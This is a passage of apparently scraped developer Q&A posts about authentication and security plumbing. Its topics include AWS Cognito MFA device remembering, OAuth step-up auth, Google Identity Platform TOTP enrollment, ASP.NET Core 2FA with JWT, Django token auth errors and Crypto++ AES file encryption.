                    &quot;MaxLength&quot;: &quot;2048&quot;
                }
            },
            {
                &quot;Name&quot;: &quot;middle_name&quot;,
                &quot;AttributeDataType&quot;: &quot;String&quot;,
                &quot;DeveloperOnlyAttribute&quot;: false,
                &quot;Mutable&quot;: true,
                &quot;Required&quot;: false,
                &quot;StringAttributeConstraints&quot;: {
                    &quot;MinLength&quot;: &quot;0&quot;,
                    &quot;MaxLength&quot;: &quot;2048&quot;
                }
            },
            {
                &quot;Name&quot;: &quot;nickname&quot;,
                &quot;AttributeDataType&quot;: &quot;String&quot;,
                &quot;DeveloperOnlyAttribute&quot;: false,
                &quot;Mutable&quot;: true,
                &quot;Required&quot;: false,
                &quot;StringAttributeConstraints&quot;: {
                    &quot;MinLength&quot;: &quot;0&quot;,
                    &quot;MaxLength&quot;: &quot;2048&quot;
                }
            },
            {
                &quot;Name&quot;: &quot;preferred_username&quot;,
                &quot;AttributeDataType&quot;: &quot;String&quot;,
                &quot;DeveloperOnlyAttribute&quot;: false,
                &quot;Mutable&quot;: true,
                &quot;Required&quot;: false,
                &quot;StringAttributeConstraints&quot;: {
                    &quot;MinLength&quot;: &quot;0&quot;,
                    &quot;MaxLength&quot;: &quot;2048&quot;
                }
            },
            {
                &quot;Name&quot;: &quot;profile&quot;,
                &quot;AttributeDataType&quot;: &quot;String&quot;,
                &quot;DeveloperOnlyAttribute&quot;: false,
                &quot;Mutable&quot;: true,
                &quot;Required&quot;: false,
                &quot;StringAttributeConstraints&quot;: {
                    &quot;MinLength&quot;: &quot;0&quot;,
                    &quot;MaxLength&quot;: &quot;2048&quot;
                }
            },
            {
                &quot;Name&quot;: &quot;picture&quot;,
                &quot;AttributeDataType&quot;: &quot;String&quot;,
                &quot;DeveloperOnlyAttribute&quot;: false,
                &quot;Mutable&quot;: true,
                &quot;Required&quot;: false,
                &quot;StringAttributeConstraints&quot;: {
                    &quot;MinLength&quot;: &quot;0&quot;,
                    &quot;MaxLength&quot;: &quot;2048&quot;
                }
            },
            {
                &quot;Name&quot;: &quot;website&quot;,
                &quot;AttributeDataType&quot;: &quot;String&quot;,
                &quot;DeveloperOnlyAttribute&quot;: false,
                &quot;Mutable&quot;: true,
                &quot;Required&quot;: false,
                &quot;StringAttributeConstraints&quot;: {
                    &quot;MinLength&quot;: &quot;0&quot;,
                    &quot;MaxLength&quot;: &quot;2048&quot;
                }
            },
            {
                &quot;Name&quot;: &quot;email&quot;,
                &quot;AttributeDataType&quot;: &quot;String&quot;,
                &quot;DeveloperOnlyAttribute&quot;: false,
                &quot;Mutable&quot;: true,
                &quot;Required&quot;: true,
                &quot;StringAttributeConstraints&quot;: {
                    &quot;MinLength&quot;: &quot;0&quot;,
                    &quot;MaxLength&quot;: &quot;2048&quot;
                }
            },
            {
                &quot;Name&quot;: &quot;email_verified&quot;,
                &quot;AttributeDataType&quot;: &quot;Boolean&quot;,
                &quot;DeveloperOnlyAttribute&quot;: false,
                &quot;Mutable&quot;: true,
                &quot;Required&quot;: false
            },
            {
                &quot;Name&quot;: &quot;gender&quot;,
                &quot;AttributeDataType&quot;: &quot;String&quot;,
                &quot;DeveloperOnlyAttribute&quot;: false,
                &quot;Mutable&quot;: true,
                &quot;Required&quot;: false,
                &quot;StringAttributeConstraints&quot;: {
                    &quot;MinLength&quot;: &quot;0&quot;,
                    &quot;MaxLength&quot;: &quot;2048&quot;
                }
            },
            {
                &quot;Name&quot;: &quot;birthdate&quot;,
                &quot;AttributeDataType&quot;: &quot;String&quot;,
                &quot;DeveloperOnlyAttribute&quot;: false,
                &quot;Mutable&quot;: true,
                &quot;Required&quot;: false,
                &quot;StringAttributeConstraints&quot;: {
                    &quot;MinLength&quot;: &quot;10&quot;,
                    &quot;MaxLength&quot;: &quot;10&quot;
                }
            },
            {
                &quot;Name&quot;: &quot;zoneinfo&quot;,
                &quot;AttributeDataType&quot;: &quot;String&quot;,
                &quot;DeveloperOnlyAttribute&quot;: false,
                &quot;Mutable&quot;: true,
                &quot;Required&quot;: false,
                &quot;StringAttributeConstraints&quot;: {
                    &quot;MinLength&quot;: &quot;0&quot;,
                    &quot;MaxLength&quot;: &quot;2048&quot;
                }
            },
            {
                &quot;Name&quot;: &quot;locale&quot;,
                &quot;AttributeDataType&quot;: &quot;String&quot;,
                &quot;DeveloperOnlyAttribute&quot;: false,
                &quot;Mutable&quot;: true,
                &quot;Required&quot;: false,
                &quot;StringAttributeConstraints&quot;: {
                    &quot;MinLength&quot;: &quot;0&quot;,
                    &quot;MaxLength&quot;: &quot;2048&quot;
                }
            },
            {
                &quot;Name&quot;: &quot;phone_number&quot;,
                &quot;AttributeDataType&quot;: &quot;String&quot;,
                &quot;DeveloperOnlyAttribute&quot;: false,
                &quot;Mutable&quot;: true,
                &quot;Required&quot;: true,
                &quot;StringAttributeConstraints&quot;: {
                    &quot;MinLength&quot;: &quot;0&quot;,
                    &quot;MaxLength&quot;: &quot;2048&quot;
                }
            },
            {
                &quot;Name&quot;: &quot;phone_number_verified&quot;,
                &quot;AttributeDataType&quot;: &quot;Boolean&quot;,
                &quot;DeveloperOnlyAttribute&quot;: false,
                &quot;Mutable&quot;: true,
                &quot;Required&quot;: false
            },
            {
                &quot;Name&quot;: &quot;address&quot;,
                &quot;AttributeDataType&quot;: &quot;String&quot;,
                &quot;DeveloperOnlyAttribute&quot;: false,
                &quot;Mutable&quot;: true,
                &quot;Required&quot;: false,
                &quot;StringAttributeConstraints&quot;: {
                    &quot;MinLength&quot;: &quot;0&quot;,
                    &quot;MaxLength&quot;: &quot;2048&quot;
                }
            },
            {
                &quot;Name&quot;: &quot;updated_at&quot;,
                &quot;AttributeDataType&quot;: &quot;Number&quot;,
                &quot;DeveloperOnlyAttribute&quot;: false,
                &quot;Mutable&quot;: true,
                &quot;Required&quot;: false,
                &quot;NumberAttributeConstraints&quot;: {
                    &quot;MinValue&quot;: &quot;0&quot;
                }
            },
            {
                &quot;Name&quot;: &quot;custom:internal-token&quot;,
                &quot;AttributeDataType&quot;: &quot;String&quot;,
                &quot;DeveloperOnlyAttribute&quot;: false,
                &quot;Mutable&quot;: true,
                &quot;Required&quot;: false,
                &quot;StringAttributeConstraints&quot;: {
                    &quot;MinLength&quot;: &quot;5&quot;
                }
            },
            {
                &quot;Name&quot;: &quot;custom:user_token&quot;,
                &quot;AttributeDataType&quot;: &quot;String&quot;,
                &quot;DeveloperOnlyAttribute&quot;: false,
                &quot;Mutable&quot;: true,
                &quot;Required&quot;: false,
                &quot;StringAttributeConstraints&quot;: {
                    &quot;MinLength&quot;: &quot;1&quot;
                }
            }
        ],
        &quot;AutoVerifiedAttributes&quot;: [
            &quot;email&quot;
        ],
        &quot;UsernameAttributes&quot;: [
            &quot;email&quot;
        ],
        &quot;VerificationMessageTemplate&quot;: {
            &quot;DefaultEmailOption&quot;: &quot;CONFIRM_WITH_CODE&quot;
        },
        &quot;UserAttributeUpdateSettings&quot;: {
            &quot;AttributesRequireVerificationBeforeUpdate&quot;: []
        },
        &quot;MfaConfiguration&quot;: &quot;OPTIONAL&quot;,
        &quot;DeviceConfiguration&quot;: {
            &quot;ChallengeRequiredOnNewDevice&quot;: true,
            &quot;DeviceOnlyRememberedOnUserPrompt&quot;: true
        },
        &quot;EstimatedNumberOfUsers&quot;: 577,
        &quot;EmailConfiguration&quot;: {
            &quot;SourceArn&quot;: &quot;arn:aws:ses:us-east-2:123456789098:identity/no-reply@abc.com&quot;,
            &quot;EmailSendingAccount&quot;: &quot;COGNITO_DEFAULT&quot;
        },
        &quot;SmsConfiguration&quot;: {
            &quot;SnsCallerArn&quot;: &quot;arn:aws:iam::123456789098:role/service-role/stagingmobileappusers-SMS-Role&quot;,
            &quot;ExternalId&quot;: &quot;3f0cc307-d5dd-44be-96ff-************&quot;,
            &quot;SnsRegion&quot;: &quot;us-east-1&quot;
        },
        &quot;UserPoolTags&quot;: {},
        &quot;Domain&quot;: &quot;devint-appusers&quot;,
        &quot;AdminCreateUserConfig&quot;: {
            &quot;AllowAdminCreateUserOnly&quot;: false,
            &quot;UnusedAccountValidityDays&quot;: 7
        },
        &quot;UsernameConfiguration&quot;: {
            &quot;CaseSensitive&quot;: false
        },
        &quot;Arn&quot;: &quot;arn:aws:cognito-idp:us-east-2:123456789098:userpool/us-east-2_********&quot;,
        &quot;AccountRecoverySetting&quot;: {
            &quot;RecoveryMechanisms&quot;: [
                {
                    &quot;Priority&quot;: 1,
                    &quot;Name&quot;: &quot;verified_email&quot;
                }
            ]
        }
    }
}
</code></pre>
<p>The following is the sample code for my <strong>MFA with SMS</strong> setup:</p>
<pre><code>import Amplify, { Auth } from 'aws-amplify';

Amplify.configure({
  Auth: {
      region: 'us-east-2', 
      userPoolId: 'us-east-2_FSabCdeff', 
      userPoolWebClientId: '2lehdjcn73nnfmmjfnvgg53'
  }
});

var globalUser = null

async function signIn(event) {
  try {
    event.preventDefault();
    console.log('event::',event)
    const username = event.currentTarget.elements.usernameInput.value;
    const password = event.currentTarget.elements.passwordInput.value
      const user = await Auth.signIn(username, password);
      globalUser = user
      console.log('user: ', user);

  } catch (error) {
      console.log('error signing in', error);
  }
}

async function verify2FA(event) {
  try {
    event.preventDefault();
    const otpCode = event.currentTarget.elements.otpField.value;
    const loggedUser = await Auth.confirmSignIn( globalUser, otpCode, 'SMS_MFA' );
      console.log('user: ', loggedUser);
      const result = await Auth.rememberDevice();
      console.log('Remember:',result);
  } catch (error) {
      console.log('error verifying otp', error);
  }
}

function App() {
  return (
    &lt;div className=&quot;App&quot;&gt;
    ______________________________________________
    &lt;h2&gt;Sign in&lt;/h2&gt;
    &lt;form onSubmit={signIn}&gt;
      &lt;div&gt;
        &lt;label htmlFor=&quot;usernameInput&quot;&gt;Username:&lt;/label&gt;
        &lt;input id=&quot;usernameInput&quot; type=&quot;text&quot; /&gt;
      &lt;/div&gt;
      &lt;div&gt;
        &lt;label htmlFor=&quot;passwordInput&quot;&gt;Password:&lt;/label&gt;
        &lt;input id=&quot;passwordInput&quot; type=&quot;text&quot; /&gt;
      &lt;/div&gt;
      &lt;button type=&quot;submit&quot;&gt;Submit&lt;/button&gt;
    &lt;/form&gt;
    ______________________________________________

    ______________________________________________
    &lt;h2&gt;MFA - SMS&lt;/h2&gt;
    &lt;form onSubmit={verify2FA}&gt;
      &lt;div&gt;
        &lt;label htmlFor=&quot;otpField&quot;&gt;OTP:&lt;/label&gt;
        &lt;input id=&quot;otpField&quot; type=&quot;text&quot; /&gt;
      &lt;/div&gt;
      &lt;button type=&quot;submit&quot;&gt;Submit&lt;/button&gt;
    &lt;/form&gt;
    ______________________________________________
    
    &lt;/div&gt;
  );
}

export default App;
</code></pre>
<p>Remember device and suppress MFA for subsequent logins are working fine for <code>dev-mobileapp-users</code> user pool. But for the other user-pool, <strong>it is always prompting for MFA</strong>. When I compare the configurations, everything looks the same. I am not getting why this issue is happening. Is this some problem with Cognito or any configuration mismatch from my end. I don't know.</p>
<p>But one point I have noticed is that, for <code>dev-mobileapp-users</code> in the <strong>Device tracking log</strong> section, I can see the device I used to login as <strong>Remembered = YES</strong> with a full <strong>Name of the device</strong>.</p>
<p>At the same time for the other user-pool, the <strong>Device tracking log</strong> section is showing my device as <strong>Remembered = YES</strong>, but <strong>Name</strong> is showing as <strong>empty</strong> (-).</p>
<p>I am wondering why the same code is behaving differently on 2 user-pools though the configurations are the same.</p>
<p>Any thoughts on this problem?</p>
"
"<p>I have an existing web site that uses OAuth for authentication (authorization code flow). The user enters user name and password during initial signon and <em>may</em> prompt for 2FA depending on analysis of the user's device signature and other risk factors. This works fine as it is.</p>
<p>Now I have been asked to add step-up authentication to this site. With step-up authentication, certain high-risk features require a 2FA challenge to be answered.</p>
<p>As I understand it, a step-up authentication challenge can be accomplished by sending the browser back to the authorization endpoint, providing an <code>acr_values</code> of &quot;urn:okta:loa:2fa&quot;. The problem is that this value tells the authorization server that I am requesting &quot;any two factors.&quot; But I don't want any two factors. They have already authenticated with a password at this point. I want only the second factor (in this case, OOB OTP) to be presented and answered, under the assumption that the password was already correctly provided earlier.</p>
<p>Is there a way to tell the auth server that I <em>only</em> want the second factor, and not the first?</p>
<p>To complicate matters, it's likely that this step-up event will occur after the original token has already passed its expiration. So I can't reliably leverage the existing IDP session.</p>
"
"<p>For security enhancement, I'd like to enforce MFA for everyone trying to access our Google Cloud project(s).</p>
<p>Our project has third-party partners, some of which doesn't have a domain and is using gmail.com addresses for authentication.</p>
<p>I did saw a <a href=""https://stackoverflow.com/questions/71427172/google-cloud-platform-enforce-multi-factor-authentication-mfa"">similar topic</a>, but it did not clarify what will happen to the users that do not belong to the same organization as the GCP project.</p>
<p>AFAIK, enforcing MFA can be enabled in Cloud Identity, which is not a Google Cloud product but a subset of Google Workspace. And, for accounts with gmail.com, there's no way I'm able to access the Cloud Identity settings for gmail.com.</p>
<p>In AWS IAM, we can use <code>aws:MultiFactorAuthPresent</code> in IAM policy condition for something similar to have conditional access for users with or without MFA.</p>
<p>Is there any way to reject Google API request from user has permission but without MFA enabled?</p>
"
"<p>On Google Identity Platform we have multi-tenants, TOTP is enabled:</p>
<pre><code>    curl -X GET &quot;https://identitytoolkit.googleapis.com/v2/projects/xxx/tenants/xxx&quot;     -H &quot;Authorization: Bearer $(gcloud auth print-access-token)&quot;     -H &quot;Content-Type: application/json&quot;     -H &quot;X-Goog-User-Project: xxx&quot;
{
  &quot;name&quot;: &quot;projects/xxx/tenants/xxx&quot;,
  &quot;displayName&quot;: &quot;xxx&quot;,
  &quot;allowPasswordSignup&quot;: true,
  &quot;enableEmailLinkSignin&quot;: true,
  &quot;hashConfig&quot;: {
    &quot;algorithm&quot;: &quot;SCRYPT&quot;,
    &quot;signerKey&quot;: &quot;xxx&quot;,
    &quot;saltSeparator&quot;: &quot;xxx&quot;,
    &quot;rounds&quot;: 8,
    &quot;memoryCost&quot;: 14
  },
  &quot;mfaConfig&quot;: {
    &quot;providerConfigs&quot;: [
      {
        &quot;totpProviderConfig&quot;: {
          &quot;adjacentIntervals&quot;: 5
        },
        &quot;state&quot;: &quot;ENABLED&quot;
      }
    ]
  },
  &quot;inheritance&quot;: {}
}
</code></pre>
<p>Now if I want to enroll it, I'm getting 400 error:
<em>Documentation <a href=""https://cloud.google.com/identity-platform/docs/reference/rest/v1/accounts/update"" rel=""nofollow noreferrer"">https://cloud.google.com/identity-platform/docs/reference/rest/v1/accounts/update</a></em></p>
<p>POST <strong><a href=""https://identitytoolkit.googleapis.com/v1/accounts:update"" rel=""nofollow noreferrer"">https://identitytoolkit.googleapis.com/v1/accounts:update</a></strong>
Body</p>
<pre><code>    {
  &quot;tenantId&quot;: &quot;xxx&quot;,
  &quot;targetProjectId&quot;: &quot;xxx&quot;,
  &quot;mfa&quot;: {
    &quot;enrollments&quot;: [
      {
        &quot;displayName&quot;: &quot;My TOTP&quot;,
        &quot;mfaEnrollmentId&quot;: &quot;totp&quot;,
        &quot;totpInfo&quot;: {}
      }
    ]
  },
  &quot;localId&quot;: &quot;xxx&quot;
}
</code></pre>
<p>Response:</p>
<pre><code>    {
  &quot;error&quot;: {
    &quot;code&quot;: 400,
    &quot;message&quot;: &quot;UNSUPPORTED_SECOND_FACTOR : attempting to add a new TOTP enrollment&quot;,
    &quot;errors&quot;: [
      {
        &quot;message&quot;: &quot;UNSUPPORTED_SECOND_FACTOR : attempting to add a new TOTP enrollment&quot;,
        &quot;domain&quot;: &quot;global&quot;,
        &quot;reason&quot;: &quot;invalid&quot;
      }
    ]
  }
}
</code></pre>
<p>The same result if I'm using Golang Firebase v4 Admin SDK</p>
<p>Do anyone know anything about the problem? It looks like TOTP is impossible to use, even in UI only available MFA SMS, but not TOTP</p>
"
"<p>I am developing an API in ASP.NET Core 8 using ASP.NET Core identity which uses 2FA  with Authenticator app for users who have enabled it.</p>
<p>The problem is this. I have checked on the 2FA  with Authenticator app implementation in Razor pages, and it creates a cookie by the name <code>Identity.TwoFactorUserId</code> and has value <code>CfDJ8MEoYd_uBmxNsdLp...</code> when the user logins with user name and password who has enabled 2FA. And this cookie is used to identify the user and validate the 2FA code from the Authenticator app</p>
<p><a href=""https://i.stack.imgur.com/AMTxG.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/AMTxG.png"" alt=""enter image description here"" /></a></p>
<p>In my case I am using JWT for my API. So once a user who has enabled 2FA  with Authenticator app logins with username and password, he will be prompted to enter the code from the  authenticator app. But with my API, there is no way to identify the user when validating the 2FA code. How can i generate a code like above in the cookie which is like <code>Identity.TwoFactorUserId</code> and has value <code>CfDJ8MEoYd_uBmxNsdLp...</code> in my API? or is there any other better way so that once the user enters the username and passowrd, then i can send him the  <code>Identity.TwoFactorUserId</code> like code so that the front end will again pass the same code with the 2FA code to identify the user?</p>
"
"<p>I'm rewriting all my PowerShell script from MSOnline to Microsoft Graph PowerShell.</p>
<p>One of my existing script below is about to disable specific user's MFA settings.</p>
<pre><code>Set-MsolUser -UserPrincipalName $UserPrincipalName -StrongAuthenticationRequirements @()
</code></pre>
<p>I can't find a way to implement in Microsoft Graph PowerShell. I checked <a href=""https://learn.microsoft.com/en-us/powershell/module/microsoft.graph.users/update-mguser?view=graph-powershell-1.0"" rel=""nofollow noreferrer"">Update-MgUser</a> page. There is no relevant arguments related to this.</p>
"
"<p>I am using OfficeDevPnP.Core to authenticate <strong>Office 365 SharePoint Online with MFA enabled</strong> but I am getting error</p>
<pre><code> using (ClientContext ctx = new OfficeDevPnP.Core.AuthenticationManager().GetAzureADCredentialsContext(siteUrl, username, securePassword))
        {
            // Your SharePoint Online operations go here
            // For example, retrieve the current user
            var currentUser = ctx.Web.CurrentUser;
            ctx.Load(currentUser);
            ctx.ExecuteQuery();

            Console.WriteLine($&quot;Authenticated user: {currentUser.Title}&quot;);
        }

Value cannot be null.
Parameter name: value
   at Newtonsoft.Json.Linq.Extensions.Value[T,U](IEnumerable`1 value)
   at OfficeDevPnP.Core.AuthenticationManager.&lt;AcquireTokenAsync&gt;d__44.MoveNext()
   at System.Runtime.CompilerServices.TaskAwaiter.ThrowForNonSuccess(Task task)
   at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)
   at OfficeDevPnP.Core.AuthenticationManager.&lt;AcquireTokenAsync&gt;d__43.MoveNext()
   at System.Runtime.CompilerServices.TaskAwaiter.ThrowForNonSuccess(Task task)
   at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)
   at OfficeDevPnP.Core.AuthenticationManager.EnsureAzureADCredentialsToken(String resourceUri, String userPrincipalName, String userPassword, AzureEnvironment environment, KnownClientId clientId)
   at OfficeDevPnP.Core.AuthenticationManager.&lt;&gt;c__DisplayClass42_0.&lt;GetAzureADCredentialsContext&gt;b__0(Object sender, WebRequestEventArgs args)
   at Microsoft.SharePoint.Client.ClientRuntimeContext.OnExecutingWebRequest(WebRequestEventArgs args)
   at Microsoft.SharePoint.Client.ClientContext.GetWebRequestExecutor()
   at Microsoft.SharePoint.Client.ClientContext.GetFormDigestInfoPrivate()
   at Microsoft.SharePoint.Client.ClientContext.EnsureFormDigest()
   at Microsoft.SharePoint.Client.ClientContext.ExecuteQuery()
   at Program.Main(String[] args) in C:\xxx\xxx\xxx\xxx\xxx\Program.cs:line 30
</code></pre>
<p>Any idea any one can help me out how I can Authenticate?</p>
<p>I have tried <strong>GetWebLoginClientContext</strong> I am able to authenticate but a pop up is coming every time i am uploading a file so i am trying alternative way to authenticate. So if any one can help me out in this using  <strong>GetAzureADCredentialsContext</strong></p>
"
"<p>I'm currently working on integrating a multi-factor authentication (MFA) system into a Node.js application with a React front end, utilizing Google's Firestore for authentication. I understand the technological aspects of implementing MFA, but I'm seeking insights on the best practices for managing MFA states, specifically in relation to user interaction and data handling.</p>
<p>After initiating an MFA request, I know that an MFA object is added to the user's authentication state. My question revolves around the management of this object post-authentication:</p>
<ul>
<li>Is it customary to immediately delete the MFA object after the user has successfully authenticated, or is there a recommended approach to refreshing or updating this object for subsequent attempts? Specifically, I'm interested in how to best manage the lifecycle of MFA data to ensure both security and a smooth user experience.How do other developers handle the persistence of MFA data in Firestore? Are there strategies for temporarily storing MFA-related information that align with best practices for security and data management?</li>
<li>Refreshing MFA States: Is there a standard approach for refreshing the MFA state for a user? For instance, if a user is authenticated but then initiates a sensitive transaction that requires re-authentication, how is this typically managed without creating a cumbersome experience for the user?</li>
</ul>
<p>I'm looking for insights on the best practices for these scenarios to ensure that the implementation is secure, user-friendly, and aligns with common strategies used in the industry. Any advice on managing MFA state, especially in the context of a React/Node.js application using Firestore, would be greatly appreciated.</p>
"
"<p>As stated in the title, I am trying to implement Twilio SMS 2FA only for one of the multiple independent admin sites that I have, but I have not found any relevant documentation for this scenario and the implementation guide does not provide any info. Has anyone successfully implemented this scenario? Thank you in advance!</p>
<p>I tried following the steps indicated in the documentation as well as following some online tutorials but they all point to how it is implemented for the default admin site and my attempts have been unsuccessful so far.</p>
"
"<p>I am trying to create a custom user blog API using class based views and token authentication. But both my register view and login view are not working properly. when I try to register user it throws an Attribute error and when I try to login it says &quot;Method Not Allowed: /register/
[15/Feb/2024 22:36:47] &quot;GET /register/ HTTP/1.1&quot; 405 13614&quot;
I think I have made some mistakes on my views file but it seems like I am stuck and cant move ahead with this error. I also tried chatgpt but it was of no use, please help.</p>
<p>this my github link for the repo <a href=""https://github.com/Rohit10jr/cbv_blog_token_auth"" rel=""nofollow noreferrer"">https://github.com/Rohit10jr/cbv_blog_token_auth</a></p>
<p>this is my register and login views</p>
<pre><code>class RegistrationAPIView(generics.CreateAPIView):
    queryset = CustomUser.objects.all()
    serializer_class = CustomUserSerializer
    permission_classes = [AllowAny]

    def create(self, request, *args, **kwargs):
        serializer = self.get_serializer(data=request.data)
        serializer.is_valid(raise_exception=True)
        user = self.perform_create(serializer)

        token, created = Token.objects.get_or_create(user=user)
        headers = self.get_success_headers(serializer.data)
        return Response({'token': token.key, 'user': serializer.data}, status=status.HTTP_201_CREATED, headers=headers)

    def perform_create(self, serializer):
        return serializer.save()
        # return super().perform_create(serializer)
        # return super().perform_create(serializer)
    
class LoginAPIView(generics.CreateAPIView):
    serializer_class = CustomUserSerializer
    permission_classes = [AllowAny]
    allowed_methods = ['POST']  # Allow both POST and GET requests

    def create(self, request, *args, **kwargs):
        email = request.data.get('email')
        password = request.data.get('password')

        user = authenticate(request, email=email, password=password)

        if user:
            login(request, user)
            serializer = self.get_serializer(user)
            token, created = Token.objects.get_or_create(user=user)
            return Response({'token': token.key, 'user': serializer.data}, status=status.HTTP_200_OK)
        else:
            return Response({'error': 'Invalid email or password'}, status=status.HTTP_401_UNAUTHORIZED)

</code></pre>
<p>this is my serializer</p>
<pre><code>class CustomUserSerializer(serializers.ModelSerializer):
    class Meta:
        model = CustomUser
        fields = ('id', 'email', 'first_name', 'last_name', 'date_joined', 'is_active', 'is_staff')
</code></pre>
<p>my traceback when i try to register</p>
<pre><code>Traceback (most recent call last):
  File &quot;D:\01 DRF learn build grow\class based view\custom user CBV blog\venv\Lib\site-packages\django\core\handlers\exception.py&quot;, line 55, in inner   
    response = get_response(request)
               ^^^^^^^^^^^^^^^^^^^^^
  File &quot;D:\01 DRF learn build grow\class based view\custom user CBV blog\venv\Lib\site-packages\django\core\handlers\base.py&quot;, line 197, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs) 
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 
  File &quot;D:\01 DRF learn build grow\class based view\custom user CBV blog\venv\Lib\site-packages\django\views\decorators\csrf.py&quot;, line 65, in _view_wrapper
    return view_func(request, *args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &quot;D:\01 DRF learn build grow\class based view\custom user CBV blog\venv\Lib\site-packages\django\views\generic\base.py&quot;, line 104, in view        
    return self.dispatch(request, *args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &quot;D:\01 DRF learn build grow\class based view\custom user CBV blog\venv\Lib\site-packages\rest_framework\views.py&quot;, line 509, in dispatch
    response = self.handle_exception(exc)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &quot;D:\01 DRF learn build grow\class based view\custom user CBV blog\venv\Lib\site-packages\rest_framework\views.py&quot;, line 469, in handle_exception 
    self.raise_uncaught_exception(exc)
  File &quot;D:\01 DRF learn build grow\class based view\custom user CBV blog\venv\Lib\site-packages\rest_framework\views.py&quot;, line 480, in raise_uncaught_exception
    raise exc
  File &quot;D:\01 DRF learn build grow\class based view\custom user CBV blog\venv\Lib\site-packages\rest_framework\views.py&quot;, line 506, in dispatch
    response = handler(request, *args, **kwargs)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &quot;D:\01 DRF learn build grow\class based view\custom user CBV blog\venv\Lib\site-packages\rest_framework\generics.py&quot;, line 190, in post
    return self.create(request, *args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &quot;D:\01 DRF learn build grow\class based view\custom user CBV blog\mainapp\views.py&quot;, line 22, in create
    token, created = Token.objects.get_or_create(user=user)
                     ^^^^^^^^^^^^^
AttributeError: type object 'Token' has no attribute 'objects'
</code></pre>
<p>error when I try to login</p>
<pre><code>Method Not Allowed: /register/
[15/Feb/2024 22:36:47] &quot;GET /register/ HTTP/1.1&quot; 405 13614
</code></pre>
"
"<p>I am trying to decrypt an encrypted file Using the Crypto++ Library. The encryption seems to work perfectly as the file that I am encrypting has Cipher text when I open it. However , just in case I will give my encryption code should it be useful.</p>
<p>Here is my Encryption Code:</p>
<pre><code>    bool Cipher::encryptFile(const char* inputFileName, const char* outputFileName)
    {

    salt = generateRandomSalt();
    generateRandomIV();

    
    if (!deriveKeyFromPassword(storedPassword, strlen(storedPassword), salt))
    {
        cerr &lt;&lt; &quot;Key derivation failed&quot; &lt;&lt; endl;
        return false;
    }

    if (iv.size() == 0 || key.size() == 0)
    {
        cerr &lt;&lt; &quot;Failed to generate IV&quot; &lt;&lt; endl;
    }

    try
    {
        ofstream outputFile(outputFileName, ios::binary | ios::trunc);
        ifstream inputFile(inputFileName, ios::binary);                                 //Input / Output files for       actual encryption
        

        if (!inputFile.is_open() || !outputFile.is_open())
        {
            cerr &lt;&lt; &quot;Error opening files&quot; &lt;&lt; endl;
            return false;
        }

        outputFile.write(reinterpret_cast&lt;const char*&gt;(salt.data()), salt.size());    //IV and salt saved to output file
        outputFile.write(reinterpret_cast&lt;const char*&gt;(iv.data()), iv.size());

        //Show Salt and IV
        cerr &lt;&lt; &quot;Read salt: &quot;;
        StringSource(reinterpret_cast&lt;const byte*&gt;(salt.data()), salt.size(), true, new   HexEncoder(new FileSink(cerr)));
        cerr &lt;&lt; endl;

        cerr &lt;&lt; &quot;Read IV: &quot;;
        StringSource(reinterpret_cast&lt;const byte*&gt;(iv.data()), iv.size(), true, new HexEncoder(new FileSink(cerr)));
        cerr &lt;&lt; endl;

        CFB_Mode&lt;AES&gt;::Encryption encryption(key, key.size(), iv);      //Choosing CFB algorithm with iv


        StreamTransformationFilter filter(encryption, new FileSink(outputFileName));    //Data is encrypted and passed to output file

        size_t fileSize = inputFile.tellg();  // Get the size of the file and reset the position to 0
        inputFile.seekg(0);

        vector&lt;char&gt; fileBuffer(fileSize);              //Input contents of inputFile into buffer
        inputFile.read(fileBuffer.data(), fileSize);    

        filter.Put(reinterpret_cast&lt;const byte*&gt;(fileBuffer.data()), fileSize);   //Puts the fileBuffer content through the encryption filter
        filter.MessageEnd();    //Ends Processsing

        inputFile.close();
        outputFile.close();

        return true;

    }
    catch (const ifstream::failure&amp; e) {
        cerr &lt;&lt; &quot;File I/O error: &quot; &lt;&lt; e.what() &lt;&lt; endl;
        return false;
    }
    catch (const Exception&amp; e) {
        cerr &lt;&lt; &quot;Encryption error: &quot; &lt;&lt; e.what() &lt;&lt; endl;
        return false;

    }
}

</code></pre>
<p>The below may be useless for my problem but I will give them just in case they are useful,they are functions I used for my encryption and decryption functions(except for Constructor and Destructor)</p>
<p>This is my constructor to get the user password so that PBKDF2 can be performed during the encryption and decryption.</p>
<pre><code>Cipher::Cipher(const char* password)
{
    size_t passwordLength = strlen(password);
    storedPassword = new char[passwordLength + 1];      // Accounting for \0 char
    strcpy_s(storedPassword, passwordLength + 1 , password);    //strcpy was unsafe
}

</code></pre>
<p>This is the destructor to destroy any dangling objects and avoid memory leaks</p>
<pre><code>Cipher::~Cipher()   //Avoding memory leaks
{
    delete[] storedPassword;
    //Crypto++ manages memory interally no need to clean up objects from library
}

</code></pre>
<p>This is the function to derive the key from my given password in the constructor</p>
<pre><code>bool Cipher::deriveKeyFromPassword(const char* password, size_t passwordLength, const SecByteBlock&amp; salt)
{
    const int iterations = 10000;

    try {
        key.resize(AES::DEFAULT_KEYLENGTH);

        PKCS5_PBKDF2_HMAC&lt;SHA256&gt; PBKDF2;       //The password-based key derivation function
        PBKDF2.DeriveKey(key, key.size(), 0, reinterpret_cast&lt;const byte*&gt;(password), passwordLength, salt, salt.size(), iterations);

        //Show the derived key
        cerr &lt;&lt; &quot;Derived Key: &quot;;
        StringSource(reinterpret_cast&lt;const byte*&gt;(key.data()), key.size(), true, new HexEncoder(new FileSink(cerr)));
        cerr &lt;&lt; endl;

        return true;
    }
    catch (const Exception e)
    {
        cerr &lt;&lt; &quot;Key Derivation error: &quot; &lt;&lt; e.what() &lt;&lt; endl;
        return false;
    }
}

</code></pre>
<p>These are the two functions that generate a random Salt and a Random IV for random key Hashing and cipher text respectively , each time I encrypt a file</p>
<pre><code>SecByteBlock Cipher::generateRandomSalt()
{
    salt.resize(16); // 16 bytes
